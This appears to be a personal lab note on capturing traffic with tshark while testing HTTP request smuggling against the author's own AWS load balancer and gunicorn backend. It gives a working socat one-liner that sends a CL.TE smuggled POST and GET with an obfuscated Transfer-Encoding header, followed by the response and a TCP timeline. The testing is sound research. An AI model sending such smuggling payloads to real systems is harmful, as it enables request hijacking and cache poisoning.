# Wireshark

## Captupuring in EC2:
```
sudo tshark -i docker0 -w /tmp/capture-1.pcap
```

### Capture 1
TLDR; 
```
Request captured in mac.
FIN was sent from ALB before ^C in mac.
Smuggled POST and GET
```

Request: 
```bash
cat <(printf "POST / HTTP/1.1\r\nHost: gunicorn-alb-1241110790.ap-south-1.elb.amazonaws.com\r\nContent-Length: 83\r\nTransfer-Encoding : chunked\r\n\r\n0\r\n\r\nGET / HTTP/1.1\r\nHost: gunicorn-alb-1241110790.ap-south-1.elb.amazonaws.com\r\n\r\n") - | socat - TCP:gunicorn-alb-1241110790.ap-south-1.elb.amazonaws.com:80
```

Responce:
```yaml
HTTP/1.1 200 OK
Date: Fri, 09 Aug 2024 16:07:26 GMT
Content-Type: application/json
Content-Length: 337
Connection: close
Server: gunicorn/20.0.0

{
  "body": "",
  "headers": {
    "Content-Length": "83",
    "Host": "gunicorn-alb-1241110790.ap-south-1.elb.amazonaws.com",
    "Transfer-Encoding": "chunked",
    "X-Amzn-Trace-Id": "Root=1-66b63ebe-45f4dfd074f4fa425cc36a6b",
    "X-Forwarded-For": "27.60.172.95",
    "X-Forwarded-Port": "80",
    "X-Forwarded-Proto": "http"
  }
}
```


### Network Communication Timeline

| **From** | **To** | **Content**          |
|----------|--------|----------------------|
| Mac      | ALB    | SYN                  |
| ALB      | Mac    | SYN, ACK             |
| Mac      | ALB    | ACK                  |
| Mac      | ALB    | POST /               |
| ALB      | Mac    | ACK                  |
| ALB      | Mac    | HTTP/1.1 200 OK      |
| ALB      | Mac    | FIN, ACK             |
| Mac      | ALB    | ACK                  |
| Mac      | ALB    | ACK                  |
| Mac      | ALB    | FIN, ACK             |
| ALB      | Mac    | ACK                  |

